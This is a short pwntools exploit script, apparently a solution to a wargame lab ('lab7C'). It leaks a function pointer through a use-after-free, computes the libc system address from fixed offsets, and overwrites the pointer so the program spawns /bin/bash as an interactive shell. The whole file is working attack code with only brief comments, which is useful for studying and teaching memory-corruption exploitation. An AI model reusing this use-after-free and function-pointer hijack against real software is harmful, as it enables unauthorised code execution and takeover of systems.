from pwn import * 

p = process("/levels/lab07/lab7C") 


# Does the memory leak by using a UAF of an integer struct to get a function pointer for the strings function
def leak_data():
    
    # Writes a number
    p.sendline('2') 
    p.sendline('1234')

    # Releases a number 
    p.sendline('4') 
    
    # Write a string 
    p.sendline('1') 
    p.sendline('test') 

    # Print the number, which is now the function pointer for the print small_str
    p.sendline('6') 
    p.sendline('1')  
    p.recvuntil('enough: ') 
    raw_line = p.recvline() 
    raw_line.replace(' ','')

    # Transform the input into an address
    address = int(raw_line[0:10])
    print "Leaked address...", hex(address)
    p.sendline('3') 
    return address


# Write to the function pointer in order to achieve a fun RCE 
def write_data(system):
    
    # Write a string and release the string
    p.sendline('1')
    # This string corresponds with the value being used in printf, to be printed. By writing this value, the system command executes the /bin/bash
    p.sendline('/bin/bash') 
    p.sendline('3') 
    
    # Write a number, which should overwrite the current function pointer for the string above with a number
    p.sendline('2') 
    p.sendline(str(system))
    p.sendline('5') 
    p.sendline('1') 

def main(): 
    leaked_address = leak_data() 
    system = leaked_address - 0x19DA37
    bin_sh = leaked_address - 0x7D1A3
    print "System address...", hex(system)
    print "/bin/sh address...", hex(bin_sh) 
    write_data(system) 
    p.interactive() 

main() 
